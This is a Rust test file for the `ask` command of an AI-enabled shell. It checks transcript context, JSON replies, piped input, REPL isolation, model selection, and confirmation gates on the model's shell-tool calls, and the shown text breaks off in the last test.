//! `ask` — the agentic loop, per-call authorization, `--json`, piped stdin, the isolated
//! REPL transcript, and `context summarize`.
//!
//! Fixtures live in the parent module ([`super`]).

use super::*;
use crate::config::limits::ASK_MAX_ITERATIONS;

/// With a provider installed, `ask` returns the model's reply on stdout (exit 0), and the request
/// it assembled carries the current transcript as context (the README "transcript is the context").
/// `ask` is `Confirm`-gated, so `sudo ask` is used here to skip the confirmation pause.
#[test]
fn ask_returns_reply_and_feeds_transcript_as_context() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::reply(
            "the answer is 42",
            seen.clone(),
        )));

        // Run a command first so there's transcript history to feed as context.
        session.run_line("echo marker_abc").await;

        let result = session
            .eval_line(r#"sudo ask "what did I just echo?""#)
            .await;
        assert_eq!(result.exit_code, 0);
        assert!(result.pending_prompt.is_none(), "sudo ask must not confirm");
        assert_eq!(
            String::from_utf8(result.stdout).unwrap(),
            "the answer is 42"
        );

        // The provider saw one turn: the first user message carries the prompt and the transcript
        // (including the prior echo), with the default model.
        let turns = seen.lock().unwrap().clone();
        assert_eq!(turns.len(), 1, "one turn expected, got: {}", turns.len());
        let content = turns[0].user_content();
        assert!(
            content.contains("what did I just echo?"),
            "user content should carry the prompt, got: {content}"
        );
        assert_eq!(turns[0].model, crate::config::model::DEFAULT_MODEL);
        assert!(
            content.contains("marker_abc"),
            "transcript context should include the prior echo, got: {content}"
        );
    });
}

/// When recording a command evicts old entries to stay under the safety cap, the leading count marker
/// is upgraded into a model-generated summary block (the README's summarize-at-leading-edge compaction).
#[test]
fn auto_compaction_summarizes_the_dropped_span() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        // Several identical summaries: each eviction re-opens the pending span and re-summarizes,
        // so more than one summarize turn can fire across the run (the last one wins the marker).
        session.set_ask_provider(Box::new(FakeProvider::scripted(
            vec![crate::ai::ask::AskResponse::text("SUMMARY: earlier work happened"); 8],
            seen.clone(),
        )));

        // Shrink the safety cap so the next few commands force an eviction (there is no user
        // command for this; the cap is fixed from config in production).
        session.set_context_cap(4);
        session.run_line("echo marker_one").await;
        session.run_line("echo marker_two").await;
        session.run_line("echo marker_three").await;

        let shown = String::from_utf8(session.eval_line("context show").await.stdout).unwrap();
        // The leading marker is a summary block carrying the model's text, not a bare count.
        assert!(
            shown.contains("[summary of") && shown.contains("SUMMARY: earlier work happened"),
            "expected a summary block at the leading edge, got:\n{shown}"
        );
        assert!(
            !shown.contains("earlier entries dropped"),
            "count marker should be upgraded"
        );

        // The provider was asked to summarize the DROPPED span (system = SUMMARIZE_SYSTEM_PROMPT),
        // not the whole transcript.
        let turns = seen.lock().unwrap().clone();
        assert!(
            turns
                .iter()
                .any(|t| t.system.as_deref() == Some(crate::ai::prompts::SUMMARIZE_SYSTEM_PROMPT)),
            "a summarize turn should have fired"
        );
    });
}

/// With no provider (native), auto-compaction leaves the bare `[N earlier entries dropped]` count
/// marker — the decided fallback: eviction never blocks or fails on the summary being unavailable.
#[test]
fn auto_compaction_falls_back_to_count_marker_without_a_provider() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        // No ask_provider injected.
        session.set_context_cap(4);
        session.run_line("echo marker_one").await;
        session.run_line("echo marker_two").await;
        session.run_line("echo marker_three").await;

        let shown = String::from_utf8(session.eval_line("context show").await.stdout).unwrap();
        assert!(
            shown.contains("earlier entries dropped"),
            "without a provider the count marker stays, got:\n{shown}"
        );
        assert!(
            !shown.contains("[summary of"),
            "no summary block without a provider"
        );
    });
}

/// `--fresh` sends no transcript context; the prompt still reaches the provider.
#[test]
fn ask_fresh_sends_empty_transcript() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::reply("ok", seen.clone())));

        session.run_line("echo should_not_appear").await;
        let result = session.eval_line(r#"sudo ask --fresh "hi""#).await;
        assert_eq!(result.exit_code, 0);

        // --fresh sends no transcript: the user content is just the prompt, no marker.
        let turns = seen.lock().unwrap().clone();
        let content = turns[0].user_content();
        assert!(
            !content.contains("should_not_appear"),
            "fresh should omit the transcript, got: {content}"
        );
        assert_eq!(content, "hi");
    });
}

/// `ask --json` with a valid-JSON reply: the JSON is on stdout, exit 0, and the model saw the
/// JSON-mode directive in its system prompt.
#[test]
fn ask_json_valid_reply_exits_zero() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::reply(
            r#"{"ok":true}"#,
            seen.clone(),
        )));

        let result = session
            .eval_line(r#"sudo ask --json --fresh "give me json""#)
            .await;
        assert_eq!(result.exit_code, 0);
        assert_eq!(String::from_utf8(result.stdout).unwrap(), r#"{"ok":true}"#);

        // The system prompt carried the JSON-mode directive.
        let turns = seen.lock().unwrap().clone();
        let system = turns[0].system.clone().unwrap_or_default();
        assert!(
            system.contains("single valid JSON value"),
            "json mode should add the directive, got: {system}"
        );
    });
}

/// `ask --json` wrapping its JSON in a Markdown code fence still validates (the fence is stripped).
#[test]
fn ask_json_strips_code_fence() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        session.set_ask_provider(Box::new(FakeProvider::reply(
            "```json\n[1,2,3]\n```",
            std::sync::Arc::new(Mutex::new(Vec::new())),
        )));
        let result = session.eval_line(r#"sudo ask --json --fresh "list""#).await;
        assert_eq!(result.exit_code, 0);
        assert_eq!(String::from_utf8(result.stdout).unwrap(), "[1,2,3]");
    });
}

/// `ask --json` with a prose (non-JSON) reply exits 6 with the raw text on stderr and empty
/// stdout — the README `--json` contract.
#[test]
fn ask_json_invalid_reply_exits_six() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        session.set_ask_provider(Box::new(FakeProvider::reply(
            "sorry, I cannot do that",
            std::sync::Arc::new(Mutex::new(Vec::new())),
        )));
        let result = session
            .eval_line(r#"sudo ask --json --fresh "give me json""#)
            .await;
        assert_eq!(result.exit_code, 6);
        assert!(result.stdout.is_empty(), "no stdout on a --json failure");
        let stderr = String::from_utf8(result.stderr).unwrap();
        assert!(
            stderr.contains("did not return valid JSON"),
            "stderr: {stderr}"
        );
        assert!(
            stderr.contains("sorry, I cannot do that"),
            "raw text preserved: {stderr}"
        );
    });
}

/// `echo hi | sudo ask "q"` (Phase B): the upstream runs, its stdout is captured and fed to the
/// model as a stdin block. `sudo` on the tail pre-authorizes (no confirmation).
#[test]
fn ask_pipe_feeds_upstream_stdout_as_stdin() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::reply("got it", seen.clone())));

        let result = session
            .eval_line(r#"echo piped_marker_xyz | sudo ask --fresh "what did I pipe?""#)
            .await;
        assert_eq!(result.exit_code, 0);
        assert_eq!(String::from_utf8(result.stdout).unwrap(), "got it");

        let turns = seen.lock().unwrap().clone();
        assert_eq!(turns.len(), 1);
        let content = turns[0].user_content();
        assert!(
            content.contains("# Piped input (stdin)"),
            "stdin block missing, got: {content}"
        );
        assert!(
            content.contains("piped_marker_xyz"),
            "captured upstream stdout should be in the stdin block, got: {content}"
        );
        // --fresh: the prompt is present, but no transcript context header.
        assert!(content.contains("what did I pipe?"));
    });
}

/// A bare (non-sudo) ask-tail pipeline surfaces the ask's confirmation, and the captured stdin
/// survives the pause: after approval, the model sees the piped bytes.
#[test]
fn ask_pipe_confirmation_preserves_stdin() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::reply("answer", seen.clone())));

        // Bare ask ⇒ pauses for confirmation; the upstream was captured for the pause.
        let surface = session
            .eval_line(r#"echo survives_pause_marker | ask --fresh "q""#)
            .await;
        assert!(
            surface.pending_prompt.is_some(),
            "bare ask-pipe should confirm"
        );
        assert!(
            seen.lock().unwrap().is_empty(),
            "model not called before approval"
        );

        // Approve ⇒ the ask runs with the preserved stdin.
        let done = session.answer_prompt(Some("yes".into())).await;
        assert_eq!(done.exit_code, 0);
        let content = seen.lock().unwrap()[0].user_content();
        assert!(
            content.contains("survives_pause_marker"),
            "stdin should survive the pause, got: {content}"
        );
    });
}

/// A denied ask-tail pipeline exits 5 and does NOT leak the captured stdin into a later ask.
#[test]
fn ask_pipe_denied_exits_five_and_clears_stdin() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::reply("later", seen.clone())));

        let surface = session
            .eval_line(r#"echo leak_marker | ask --fresh "q""#)
            .await;
        assert!(surface.pending_prompt.is_some());
        let denied = session.answer_prompt(Some("no".into())).await;
        assert_eq!(denied.exit_code, 5);
        assert!(
            seen.lock().unwrap().is_empty(),
            "denied ask never calls the model"
        );

        // A subsequent unrelated sudo ask must not carry the earlier pipe's stdin.
        session.eval_line(r#"sudo ask --fresh "hello""#).await;
        let content = seen.lock().unwrap()[0].user_content();
        assert!(
            !content.contains("leak_marker"),
            "stale stdin leaked into a later ask, got: {content}"
        );
    });
}

/// `sudo context summarize` runs the LLM (no pause), prints the summary, and does NOT mutate or
/// re-record the transcript (inspection only, like `context show`).
#[test]
fn context_summarize_returns_summary_without_mutating() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::reply(
            "You ran two echo commands.",
            seen.clone(),
        )));
        session.run_line("echo original_marker_one").await;
        session.run_line("echo original_marker_two").await;

        let result = session.eval_line("sudo context summarize").await;
        assert_eq!(result.exit_code, 0);
        assert_eq!(
            String::from_utf8(result.stdout).unwrap(),
            "You ran two echo commands.\n"
        );
        assert!(result.pending_prompt.is_none(), "sudo must not pause");
        // The provider saw the transcript (the two echoes) as its user content.
        let content = seen.lock().unwrap()[0].user_content();
        assert!(content.contains("original_marker_one") && content.contains("original_marker_two"));

        // The transcript is UNCHANGED: both echoes still there, the summary is NOT recorded.
        let shown = String::from_utf8(session.eval_line("context show").await.stdout).unwrap();
        assert!(shown.contains("original_marker_one") && shown.contains("original_marker_two"));
        assert!(
            !shown.contains("You ran two echo commands"),
            "summary must not be recorded"
        );
    });
}

/// A bare (non-sudo) `context summarize` surfaces a Confirm pause (outbound LLM HTTP); deny → exit
/// 5, approve → runs.
#[test]
fn context_summarize_confirms_then_runs() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::reply("a summary", seen.clone())));
        session.run_line("echo something").await;

        // Bare summarize pauses.
        let surface = session.eval_line("context summarize").await;
        assert!(
            surface.pending_prompt.is_some(),
            "bare summarize should confirm"
        );
        assert!(
            seen.lock().unwrap().is_empty(),
            "model not called before approval"
        );

        // Approve ⇒ runs.
        let done = session.answer_prompt(Some("yes".into())).await;
        assert_eq!(done.exit_code, 0);
        assert_eq!(String::from_utf8(done.stdout).unwrap(), "a summary\n");
        // The summary is still not recorded after the deferred run.
        let shown = String::from_utf8(session.eval_line("context show").await.stdout).unwrap();
        assert!(
            !shown.contains("a summary"),
            "deferred summary must not be recorded"
        );
    });
}

/// A denied `context summarize` exits 5 and never calls the model.
#[test]
fn context_summarize_denied_exits_five() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::reply("nope", seen.clone())));
        session.run_line("echo x").await;
        let surface = session.eval_line("context summarize").await;
        assert!(surface.pending_prompt.is_some());
        let denied = session.answer_prompt(Some("no".into())).await;
        assert_eq!(denied.exit_code, 5);
        assert!(
            seen.lock().unwrap().is_empty(),
            "denied summarize never calls the model"
        );
    });
}

/// `context summarize` with no provider (native) degrades to a clean exit-4 error.
#[test]
fn context_summarize_without_provider_errors() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        session.run_line("echo x").await;
        let result = session.eval_line("sudo context summarize").await;
        assert_eq!(result.exit_code, 4);
        assert!(String::from_utf8(result.stderr)
            .unwrap()
            .contains("no model provider"));
    });
}

/// `context summarize` inside `$(...)` stays with Brush and hits the honest error (it can't run
/// the LLM in the nested runtime).
#[test]
fn context_summarize_in_substitution_is_honest() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        session.set_ask_provider(Box::new(FakeProvider::reply(
            "should not run",
            std::sync::Arc::new(Mutex::new(Vec::new())),
        )));
        session.run_line("echo x").await;
        let result = session.eval_line("echo $(context summarize)").await;
        // The nested summarize errors honestly; the outer echo still exits 0 with the error text
        // captured (Brush substitutes the stderr-less builtin output).
        let combined = format!(
            "{}{}",
            String::from_utf8_lossy(&result.stdout),
            String::from_utf8_lossy(&result.stderr)
        );
        assert!(combined.contains("needs the model"), "combined: {combined}");
    });
}

/// `ask repl` on the durable-agent path (via `eval_line`) returns an honest not-here message
/// (exit 2), never trying to run a blocking interactive loop.
#[test]
fn ask_repl_via_eval_line_is_honest_message() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let result = session.eval_line("ask repl").await;
        assert_eq!(result.exit_code, 2);
        let stderr = String::from_utf8(result.stderr).unwrap();
        assert!(
            stderr.contains("native-terminal feature"),
            "stderr: {stderr}"
        );
        assert!(result.pending_prompt.is_none());
    });
}

/// A native REPL turn runs against the ISOLATED transcript: the model sees the REPL's own history,
/// the main session transcript is untouched, and the exchange is recorded into the REPL transcript.
#[test]
fn repl_turn_uses_isolated_transcript() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::scripted(
            vec![
                crate::ai::ask::AskResponse::text("first reply"),
                crate::ai::ask::AskResponse::text("second reply"),
            ],
            seen.clone(),
        )));

        // Put a marker in the MAIN transcript; the REPL (fresh) must NOT see it.
        session.run_line("echo main_transcript_marker").await;

        let args = crate::ai::ask::ReplArgs {
            model: None,
            seed: crate::ai::ask::ReplSeed::Fresh,
        };
        session.repl_start(&args).unwrap();

        let r1 = session.repl_turn("hello there").await;
        assert_eq!(r1, "first reply");
        // The first turn saw a fresh context (no main-transcript marker).
        let content1 = seen.lock().unwrap()[0].user_content();
        assert!(
            !content1.contains("main_transcript_marker"),
            "repl leaked main: {content1}"
        );
        assert!(content1.contains("hello there"));

        // The second turn sees the FIRST exchange (isolated transcript grew).
        let _r2 = session.repl_turn("and again").await;
        let content2 = seen.lock().unwrap()[1].user_content();
        assert!(
            content2.contains("first reply"),
            "repl turn2 missing history: {content2}"
        );
        assert!(
            content2.contains("hello there"),
            "repl turn2 missing prior prompt"
        );

        // Exiting renders the REPL session; the main transcript still has only its own marker.
        let rendered = String::from_utf8(session.repl_end()).unwrap();
        assert!(rendered.contains("first reply") && rendered.contains("and again"));
        let main = String::from_utf8(session.eval_line("context show").await.stdout).unwrap();
        assert!(main.contains("main_transcript_marker"));
        assert!(
            !main.contains("first reply"),
            "REPL content leaked into main mid-session"
        );
    });
}

/// `:model` switches the REPL's model; `:new-session` clears its transcript; `:exit` signals exit.
#[test]
fn repl_meta_commands() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        session.set_ask_provider(Box::new(FakeProvider::reply(
            "ok",
            std::sync::Arc::new(Mutex::new(Vec::new())),
        )));
        let args = crate::ai::ask::ReplArgs {
            model: None,
            seed: crate::ai::ask::ReplSeed::Fresh,
        };
        session.repl_start(&args).unwrap();
        assert_eq!(
            session.repl_model().as_deref(),
            Some(crate::config::model::DEFAULT_MODEL)
        );

        // :model switches (anthropic/ prefix stripped).
        let (out, exit) = session
            .repl_meta(":model anthropic/claude-sonnet-5")
            .unwrap();
        assert!(!exit);
        assert!(out.contains("claude-sonnet-5"));
        assert_eq!(session.repl_model().as_deref(), Some("claude-sonnet-5"));

        // A prompt grows the transcript; :new-session clears it.
        session.repl_turn("hi").await;
        let (_out, _exit) = session.repl_meta(":new-session").unwrap();
        // After clearing, the next turn sees no prior history.
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::reply("ok2", seen.clone())));
        session.repl_turn("fresh start").await;
        let content = seen.lock().unwrap()[0].user_content();
        assert!(
            !content.contains("hi"),
            "new-session should have cleared history: {content}"
        );

        // :exit signals exit; a non-meta line returns None.
        assert!(session.repl_meta(":exit").unwrap().1);
        assert!(session.repl_meta("just a prompt").is_none());
    });
}

/// `ask`'s reply is recorded into the transcript like any command output, so a follow-up `ask`
/// (or `context show`) sees the prior exchange — the README "run a command, ask about it" loop.
#[test]
fn ask_reply_is_recorded_in_transcript() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        session.set_ask_provider(Box::new(FakeProvider::reply(
            "recorded_reply_xyz",
            std::sync::Arc::new(Mutex::new(Vec::new())),
        )));

        session.run_line(r#"sudo ask "q""#).await;
        let (transcript, _) = session.run_line("context show").await;
        let transcript = String::from_utf8(transcript).unwrap();
        assert!(
            transcript.contains("recorded_reply_xyz"),
            "the ask reply should be in the transcript, got: {transcript}"
        );
    });
}

/// Without a provider (the native default), `ask` degrades to a clean error (exit 4), not a panic.
#[test]
fn ask_without_provider_reports_not_configured() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let result = session.eval_line(r#"sudo ask "hi""#).await;
        assert_eq!(result.exit_code, 4);
        assert!(String::from_utf8(result.stderr)
            .unwrap()
            .contains("no model provider configured"));
    });
}

/// Bare `ask` (no sudo) surfaces the outbound-HTTP confirmation, like curl/wget — it does not
/// call the provider until approved.
#[test]
fn ask_surfaces_a_confirmation() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::reply(
            "should not run yet",
            seen.clone(),
        )));

        let result = session.eval_line(r#"ask "hi""#).await;
        let pending = result
            .pending_prompt
            .expect("bare ask should surface a confirm");
        assert!(
            pending.question.to_lowercase().contains("ask"),
            "got: {}",
            pending.question
        );
        // The provider must NOT have run before approval.
        assert!(
            seen.lock().unwrap().is_empty(),
            "provider ran before approval"
        );

        // Approving runs the deferred ask.
        let answered = session.answer_prompt(Some("yes".to_string())).await;
        assert_eq!(answered.exit_code, 0);
        assert_eq!(
            String::from_utf8(answered.stdout).unwrap(),
            "should not run yet"
        );
    });
}

// ---- A2: the agentic shell-tool loop --------------------------------------------------------

/// The model calls the `shell` tool once, the loop runs the command, feeds back the result, and
/// the model answers. The tool result carries the command's stdout; the trace is on stderr.
#[test]
fn ask_shell_tool_runs_command_and_feeds_result_back() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::scripted(
            vec![
                shell_tool_call("c1", "echo MARK_42"),
                crate::ai::ask::AskResponse::text("done: I saw MARK_42"),
            ],
            seen.clone(),
        )));

        let result = session.eval_line(r#"sudo ask "echo the marker""#).await;
        assert_eq!(result.exit_code, 0);
        assert_eq!(
            String::from_utf8(result.stdout).unwrap(),
            "done: I saw MARK_42"
        );
        // Trace framing on stderr.
        let stderr = String::from_utf8(result.stderr).unwrap();
        assert!(stderr.contains("[tool] $ echo MARK_42"), "got: {stderr}");
        assert!(stderr.contains("[tool] exit 0"), "got: {stderr}");
        // The tool result fed back carried the command's stdout.
        let tr = last_tool_result(&seen, "c1").expect("a tool result for c1");
        let payload = tr.outcome.expect("shell tool succeeded");
        assert!(payload.contains("MARK_42"), "result payload: {payload}");
    });
}

/// Under a plain (approved, non-sudo) ask, a `confirm`-policy tool line (curl) PAUSES for
/// authorization (A3); denying it feeds a "denied by user" result back and the loop continues.
#[test]
fn ask_confirm_tool_pauses_and_deny_continues() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::scripted(
            vec![
                shell_tool_call("c1", "curl https://example.com"),
                crate::ai::ask::AskResponse::text("I could not fetch it"),
            ],
            seen.clone(),
        )));

        // Bare ask → surfaces the ask confirmation; approve it (blanket stays false).
        let first = session.eval_line(r#"ask "fetch it""#).await;
        assert!(
            first.pending_prompt.is_some(),
            "bare ask should confirm first"
        );
        let second = session.answer_prompt(Some("yes".to_string())).await;
        // The curl tool call now surfaces its OWN authorization pause.
        let pending = second
            .pending_prompt
            .expect("curl tool should pause for authz");
        assert!(
            pending.question.to_lowercase().contains("permission"),
            "got: {}",
            pending.question
        );
        // Deny it → loop continues, model answers, ask exits 0.
        let result = session.answer_prompt(Some("no".to_string())).await;
        assert_eq!(result.exit_code, 0);
        assert_eq!(
            String::from_utf8(result.stdout).unwrap(),
            "I could not fetch it"
        );

        let tr = last_tool_result(&seen, "c1").expect("a tool result for c1");
        let msg = tr.outcome.expect_err("denied curl is an error result");
        assert!(msg.contains("denied by user"), "got: {msg}");
    });
}

/// Even under `sudo ask`, a `sudo-only` tool line (rm) still PAUSES (blanket covers confirm-tier
/// only); denying it leaves the file intact.
#[test]
fn ask_sudo_only_tool_pauses_even_under_sudo_ask() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        // `rm` is sudo-only in the default policy table; try to delete a marker file.
        let path = std::env::temp_dir().join("clank_ask_sudoonly_proof");
        std::fs::write(&path, b"keep").unwrap();
        session.set_ask_provider(Box::new(FakeProvider::scripted(
            vec![
                shell_tool_call("c1", &format!("rm {}", path.display())),
                crate::ai::ask::AskResponse::text("could not remove"),
            ],
            seen.clone(),
        )));

        let first = session
            .eval_line(&format!(r#"sudo ask "delete {}""#, path.display()))
            .await;
        // Even under sudo ask, the sudo-only rm pauses (no "all" offered for this tier).
        let pending = first
            .pending_prompt
            .expect("sudo-only rm should pause under sudo ask");
        assert!(
            !pending
                .choices
                .clone()
                .unwrap_or_default()
                .contains(&"all".to_string()),
            "sudo-only pause must not offer 'all'"
        );
        let result = session.answer_prompt(Some("no".to_string())).await;
        assert_eq!(result.exit_code, 0);
        let tr = last_tool_result(&seen, "c1").expect("a tool result for c1");
        assert!(tr.outcome.is_err(), "denied rm is an error result");
        assert!(path.exists(), "the file must survive the denied rm");
        std::fs::remove_file(&path).ok();
    });
}

/// `sudo ask` pre-authorizes confirm-tier up front: a curl tool call runs without any pause and
/// its body comes back in the tool result.
#[test]
fn ask_sudo_pre_authorizes_confirm_tool() {
    on_rt(async {
        let url = http_mock("fetched-body");
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::scripted(
            vec![
                shell_tool_call("c1", &format!("curl {url}")),
                crate::ai::ask::AskResponse::text("done"),
            ],
            seen.clone(),
        )));

        let first = session.eval_line(r#"sudo ask "fetch it""#).await;
        // sudo ask grants blanket confirm-tier up front → curl does not pause.
        assert!(
            first.pending_prompt.is_none(),
            "sudo ask pre-authorizes curl (no pause)"
        );
        assert_eq!(first.exit_code, 0);
        let tr = last_tool_result(&seen, "c1").unwrap().outcome.unwrap();
        assert!(
            tr.contains("fetched-body"),
            "curl body should be in the tool result: {tr}"
        );
    });
}

/// A `curl` under a plain approved ask pauses; answering "all" runs it and pre-authorizes a second
/// confirm-tier call in a later turn (no second pause).
#[test]
fn ask_all_answer_upgrades_blanket_mid_loop() {
    on_rt(async {
        let url_a = http_mock("body-a");
        let url_b = http_mock("body-b");
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::scripted(
            vec![
                shell_tool_call("c1", &format!("curl {url_a}")),
                shell_tool_call("c2", &format!("curl {url_b}")),
                crate::ai::ask::AskResponse::text("done"),
            ],
            seen.clone(),
        )));

        // Plain ask (blanket false): approve the ask, then the first curl pauses.
        session.eval_line(r#"ask "fetch a then b""#).await;
        let after_ask = session.answer_prompt(Some("yes".to_string())).await;
        assert!(
            after_ask.pending_prompt.is_some(),
            "first curl should pause"
        );
        // Answer "all" → runs c1 AND pre-authorizes c2 (no second pause) → loop completes.
        let done = session.answer_prompt(Some("all".to_string())).await;
        assert!(
            done.pending_prompt.is_none(),
            "all should carry through to c2"
        );
        assert_eq!(done.exit_code, 0);
        assert_eq!(String::from_utf8(done.stdout).unwrap(), "done");
        // Both curls actually ran.
        assert!(last_tool_result(&seen, "c1")
            .unwrap()
            .outcome
            .unwrap()
            .contains("body-a"));
        assert!(last_tool_result(&seen, "c2")
            .unwrap()
            .outcome
            .unwrap()
            .contains("body-b"));
    });
}

/// The `prompt_user` tool pauses the loop with the model's question; the human's answer becomes the
/// tool result and the loop continues.
#[test]
fn ask_prompt_user_tool_round_trips() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        let prompt_call = crate::ai::ask::AskResponse {
            text: String::new(),
            tool_calls: vec![crate::ai::ask::AskToolCall {
                id: "p1".into(),
                name: crate::ai::prompts::PROMPT_USER_TOOL.into(),
                arguments_json: serde_json::json!({ "question": "What port should I use?" })
                    .to_string(),
            }],
            finished_for_tools: true,
            error: None,
        };
        session.set_ask_provider(Box::new(FakeProvider::scripted(
            vec![
                prompt_call,
                crate::ai::ask::AskResponse::text("using port 8080"),
            ],
            seen.clone(),
        )));

        let first = session.eval_line(r#"sudo ask "set up the server""#).await;
        let pending = first.pending_prompt.expect("prompt_user should pause");
        assert!(
            pending.question.contains("port"),
            "got: {}",
            pending.question
        );
        let done = session.answer_prompt(Some("8080".to_string())).await;
        assert_eq!(done.exit_code, 0);
        assert_eq!(String::from_utf8(done.stdout).unwrap(), "using port 8080");
        // The answer reached the model as the tool result.
        let tr = last_tool_result(&seen, "p1").unwrap();
        assert!(
            tr.outcome.unwrap().contains("8080"),
            "answer should be the tool result"
        );
    });
}

/// Killing the paused ask row (or Ctrl-C) aborts the whole ask: exit 130.
#[test]
fn ask_pause_kill_aborts_the_whole_ask() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        let prompt_call = crate::ai::ask::AskResponse {
            text: String::new(),
            tool_calls: vec![crate::ai::ask::AskToolCall {
                id: "p1".into(),
                name: crate::ai::prompts::PROMPT_USER_TOOL.into(),
                arguments_json: serde_json::json!({ "question": "continue?" }).to_string(),
            }],
            finished_for_tools: true,
            error: None,
        };
        session.set_ask_provider(Box::new(FakeProvider::scripted(
            vec![
                prompt_call,
                crate::ai::ask::AskResponse::text("should not reach"),
            ],
            seen.clone(),
        )));

        let first = session.eval_line(r#"sudo ask "do a thing""#).await;
        assert!(first.pending_prompt.is_some(), "prompt_user should pause");
        // Abort (as a kill of the paused row would, via answer_prompt(None)).
        let aborted = session.answer_prompt(None).await;
        assert_eq!(aborted.exit_code, 130);
        assert!(session.pending.is_none(), "no pending after abort");
    });
}

/// `model default X` (via the builtin) makes `ask` target X; an explicit `--model` overrides it.
/// Exercises the full ask.toml resolution chain through a real Session.
#[test]
fn ask_uses_model_default_and_flag_overrides() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::scripted(
            vec![
                crate::ai::ask::AskResponse::text("a"),
                crate::ai::ask::AskResponse::text("b"),
            ],
            seen.clone(),
        )));
        // Point HOME at a unique temp dir so ask.toml is hermetic (nanos avoids cross-test clash).
        let home = std::env::temp_dir().join(format!(
            "clank_ask_model_{}_{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&home).unwrap();
        session
            .run_line(&format!("export HOME={}", home.display()))
            .await;

        // Set the default; a bare ask uses it. The provider now receives the FULL `provider/model`
        // id (the injected dispatcher splits the prefix and routes) rather than a stripped bare id.
        session
            .run_line("model default anthropic/claude-sonnet-4-5")
            .await;
        session.run_line(r#"sudo ask --fresh "hi""#).await;
        assert_eq!(
            seen.lock().unwrap().last().unwrap().model,
            "anthropic/claude-sonnet-4-5"
        );

        // An explicit --model overrides the default. A bare id (no prefix) passes through bare.
        session
            .run_line(r#"sudo ask --fresh --model claude-haiku-4-5 "hi""#)
            .await;
        assert_eq!(
            seen.lock().unwrap().last().unwrap().model,
            "claude-haiku-4-5"
        );

        std::fs::remove_dir_all(&home).ok();
    });
}

/// An unknown provider prefix in `--model` fails before any model call (exit 2).
#[test]
fn ask_unknown_provider_prefix_errors() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::reply("x", seen.clone())));
        // A truly-unknown provider errors before any call (known providers like openai now route).
        let result = session
            .eval_line(r#"sudo ask --model frobnicate/x --fresh "hi""#)
            .await;
        assert_eq!(result.exit_code, 2);
        assert!(String::from_utf8(result.stderr)
            .unwrap()
            .contains("unknown provider"));
        // The provider was never called.
        assert!(seen.lock().unwrap().is_empty());
    });
}

/// The model trying to call `ask` recursively via the shell tool is refused.
#[test]
fn ask_recursion_is_refused() {
    on_rt(async {
        let mut session = Session::new().await.unwrap();
        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
        session.set_ask_provider(Box::new(FakeProvider::scripted(
            vec![
                shell_tool_call("c1", "ask what is 2+2"),
                crate::ai::ask::AskResponse::text("ok"),
